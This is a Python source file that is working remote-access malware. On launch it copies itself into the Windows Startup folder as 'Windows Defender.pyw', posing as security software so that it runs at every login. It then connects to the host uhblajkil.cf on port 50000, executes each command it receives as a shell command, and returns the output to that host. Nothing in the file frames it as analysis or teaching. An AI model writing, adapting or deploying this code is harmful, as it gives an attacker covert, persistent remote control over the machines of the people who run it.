import socket
from subprocess import check_output, CalledProcessError
from pickle import dumps
from os import getlogin


class Socket:

    header = 10
    established = False
    cmd_received = False

    def connect_to_server(self):
        try:
            self.active_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.active_socket.connect(("uhblajkil.cf", 50000))
            Socket.established = True
            print("Connection established")
        except (ConnectionRefusedError, TimeoutError, socket.error):
            Socket.established = False
            print("No connection established!")

    def receive_command(self):
        try:
            cmd = self.active_socket.recv(64)
        except ConnectionResetError:
            self.established = False
            return False
        cmd = cmd.decode()
        try:
            output = check_output(cmd, shell=True)
        except CalledProcessError as error:
            self.send_msg(error)
            return False
        output = ''.join(chr(i) for i in output)
        self.send_msg(output)
        return True

    def send_msg(self, msg):
        try:
            msg = dumps(msg)
            msg = bytes(f"{len(msg):{self.header}}", "utf-8") + msg
            self.active_socket.send(msg)
        except(ConnectionResetError, ConnectionAbortedError, OSError):
            self.established = False


def copy_to_startup(file_name):
    startup_path = "C:\\Users\\" + getlogin() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
    with open(__file__, "rb")as file:
        file_bytes = file.read()
    with open(startup_path + file_name, "wb")as file:
        file.write(file_bytes)


copy_to_startup("Windows Defender.pyw")
connection = Socket()
while True:
    if not connection.established:
        connection.connect_to_server()
        continue
    while connection.receive_command():
        pass
